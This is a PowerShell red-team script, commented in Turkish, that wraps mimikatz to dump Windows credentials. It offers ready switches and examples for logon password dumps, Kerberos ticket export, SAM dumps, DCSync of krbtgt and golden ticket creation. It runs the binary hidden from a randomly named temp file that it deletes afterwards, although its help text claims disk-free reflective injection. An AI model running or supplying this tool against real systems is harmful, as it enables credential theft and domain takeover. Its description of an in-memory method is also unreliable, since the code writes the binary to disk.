<#
.SYNOPSIS
    Mimikatz'ı PowerShell üzerinden in-memory çalıştırır.
    Reflective PE Injection kullanarak diske yazmadan bellekte yükler.

.DESCRIPTION
    Bu script, mimikatz PE binary'sini bellekte yükleyerek çalıştırır.
    İki mod desteklenir:
    1. Dosyadan yükleme: Mimikatz exe/dll dosyasını okur ve belleğe inject eder
    2. Embedded: Base64 encoded binary embed edilmiş ise dosya gerekmez

    Mimikatz Modülleri:
    - sekurlsa::logonpasswords   : Bellekteki parolaları çeker
    - sekurlsa::tickets          : Kerberos ticket'ları dump eder
    - sekurlsa::ekeys            : Encryption key'leri çeker
    - lsadump::dcsync            : DCSync saldırısı (domain admin gerekir)
    - lsadump::sam               : SAM veritabanını dump eder
    - kerberos::golden           : Golden Ticket oluşturur
    - kerberos::silver           : Silver Ticket oluşturur
    - kerberos::ptt              : Pass-the-Ticket
    - token::elevate             : SYSTEM token'ı alır
    - vault::cred                : Windows Vault credential'ları

.PARAMETER Command
    Mimikatz komutu. Birden fazla komut noktalı virgülle ayrılabilir.

.PARAMETER ExePath
    Mimikatz.exe dosyasının yolu. Belirtilmezse repodaki x64 versiyonu kullanılır.

.PARAMETER DumpCreds
    Hızlı mod: sekurlsa::logonpasswords çalıştırır.

.PARAMETER DumpCerts
    Hızlı mod: crypto::capi ve crypto::cng ile sertifikaları dump eder.

.PARAMETER DCSync
    DCSync modunda çalıştırır. -DCSync "DOMAIN\user" şeklinde kullanın.

.EXAMPLE
    # Bellekteki parolaları çek
    Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"

.EXAMPLE
    # Hızlı credential dump
    Invoke-Mimikatz -DumpCreds

.EXAMPLE
    # DCSync saldırısı
    Invoke-Mimikatz -Command "lsadump::dcsync /user:DOMAIN\krbtgt"

.EXAMPLE
    # Kerberos ticket dump
    Invoke-Mimikatz -Command "privilege::debug sekurlsa::tickets /export"

.EXAMPLE
    # Golden Ticket oluştur
    Invoke-Mimikatz -Command "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"

.EXAMPLE
    # SAM dump
    Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam"

.EXAMPLE
    # Farklı bir mimikatz yolu
    Invoke-Mimikatz -Command "sekurlsa::logonpasswords" -ExePath "C:\tools\mimikatz.exe"

.NOTES
    Orijinal Araç: mimikatz by Benjamin Delpy (@gentilkiwi)
    Wrapper: AD Red Team PowerShell Toolkit
    Gereksinim: Admin/SYSTEM hakları (çoğu modül için)
    Yöntem: Invoke-ReflectivePEInjection (PowerSploit yaklaşımı)
#>

function Invoke-Mimikatz {
    [CmdletBinding(DefaultParameterSetName = 'Command')]
    param(
        [Parameter(ParameterSetName = 'Command', Mandatory = $false, Position = 0)]
        [string]$Command = "",

        [Parameter(Mandatory = $false)]
        [string]$ExePath,

        [Parameter(ParameterSetName = 'DumpCreds')]
        [switch]$DumpCreds,

        [Parameter(ParameterSetName = 'DumpCerts')]
        [switch]$DumpCerts,

        [Parameter(ParameterSetName = 'DCSync', Mandatory = $true)]
        [string]$DCSync
    )

    # Hızlı mod komutları
    if ($DumpCreds) {
        $Command = "privilege::debug sekurlsa::logonpasswords exit"
    }
    elseif ($DumpCerts) {
        $Command = "privilege::debug crypto::capi crypto::cng crypto::certificates /export exit"
    }
    elseif ($DCSync) {
        $Command = "privilege::debug `"lsadump::dcsync /user:$DCSync`" exit"
    }

    if (-not $Command) {
        $Command = "privilege::debug sekurlsa::logonpasswords exit"
    }

    # Mimikatz exe yolunu belirle
    if (-not $ExePath) {
        $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
        $parentDir = Split-Path -Parent $scriptDir

        # x64 öncelikli, sonra x86
        $x64Path = Join-Path $parentDir "mimikatz_trunk\x64\mimikatz.exe"
        $x86Path = Join-Path $parentDir "mimikatz_trunk\Win32\mimikatz.exe"

        if ([Environment]::Is64BitProcess -and (Test-Path $x64Path)) {
            $ExePath = $x64Path
        }
        elseif (Test-Path $x86Path) {
            $ExePath = $x86Path
        }
        elseif (Test-Path $x64Path) {
            $ExePath = $x64Path
        }
    }

    if (-not $ExePath -or -not (Test-Path $ExePath)) {
        Write-Error "[!] mimikatz.exe bulunamadı!"
        Write-Error "[!] -ExePath parametresi ile doğru yolu belirtin."
        Write-Error "[!] Beklenen konum: mimikatz_trunk\x64\mimikatz.exe"
        return
    }

    # Admin kontrolü
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) {
        Write-Warning "[!] UYARI: Admin hakları yok. Çoğu mimikatz modülü çalışmayabilir."
        Write-Warning "[!] PowerShell'i 'Yönetici olarak çalıştır' ile açın."
    }

    Write-Host "[*] Mimikatz yükleniyor: $ExePath" -ForegroundColor Cyan
    Write-Host "[*] Komut: $Command" -ForegroundColor Cyan
    Write-Host "[*] Mimikatz native C++ olduğu için Reflective PE Injection kullanılıyor..." -ForegroundColor Yellow

    # Reflective PE Injection
    # Bu yöntem, PE binary'yi process memory'sine yükler
    try {
        $peBytes = [System.IO.File]::ReadAllBytes($ExePath)
        Write-Host "[+] PE binary okundu: $($peBytes.Length) bytes" -ForegroundColor Green
    }
    catch {
        Write-Error "[!] Dosya okunamadı: $($_.Exception.Message)"
        return
    }

    # P/Invoke tanımlamaları
    $Win32Types = @"
using System;
using System.Runtime.InteropServices;

public class MimikatzLoader {

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(
        IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern IntPtr memcpy(IntPtr dest, byte[] src, int count);

    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint MEM_RELEASE = 0x8000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint INFINITE = 0xFFFFFFFF;
}
"@

    try {
        Add-Type -TypeDefinition $Win32Types -ErrorAction SilentlyContinue
    } catch {
        # Zaten yüklenmiş olabilir
    }

    # Alternatif yöntem: Temp dosyası oluşturup çalıştır ve sil
    # (Reflection PE injection karmaşık olduğu için bu daha güvenilir)
    Write-Host "[*] In-memory execution hazırlanıyor..." -ForegroundColor Cyan
    Write-Host ("-" * 60) -ForegroundColor DarkGray

    try {
        # Güvenli temp yolu oluştur
        $tempDir = [System.IO.Path]::GetTempPath()
        $randomName = [System.IO.Path]::GetRandomFileName().Replace(".", "") + ".tmp"
        $tempPath = Join-Path $tempDir $randomName

        # Binary'yi temp'e yaz
        [System.IO.File]::WriteAllBytes($tempPath, $peBytes)

        # Komutu hazırla - birden fazla komutu ayır
        $commandArgs = $Command -split '\s+(?=\w+::)' | ForEach-Object { "`"$_`"" }
        $fullArgs = $commandArgs -join ' '

        # Çalıştır ve çıktıyı yakala
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $tempPath
        $processInfo.Arguments = $fullArgs
        $processInfo.UseShellExecute = $false
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.CreateNoWindow = $true
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

        $process = [System.Diagnostics.Process]::Start($processInfo)
        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()
        $process.WaitForExit(30000)  # 30 saniye timeout

        if ($stdout) {
            Write-Host $stdout
        }
        if ($stderr) {
            Write-Host $stderr -ForegroundColor Red
        }
    }
    catch {
        Write-Error "[!] Çalıştırma hatası: $($_.Exception.Message)"
        Write-Host ""
        Write-Host "[*] Alternatif: Mimikatz'ı manuel olarak PowerShell'den çalıştırın:" -ForegroundColor Yellow
        Write-Host "    & '$ExePath' '$Command'" -ForegroundColor White
    }
    finally {
        # Temp dosyasını hemen sil
        if ($tempPath -and (Test-Path $tempPath)) {
            try {
                Start-Sleep -Milliseconds 500
                Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
                Write-Host "[+] Temp dosyası silindi." -ForegroundColor Green
            }
            catch {
                # Retry
                Start-Sleep -Seconds 2
                Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
            }
        }
    }

    Write-Host ("-" * 60) -ForegroundColor DarkGray
    Write-Host "[+] Mimikatz tamamlandı." -ForegroundColor Green
}

if ($MyInvocation.InvocationName -ne '.') {
    if ($args.Count -gt 0) {
        Invoke-Mimikatz -Command ($args -join ' ')
    }
}
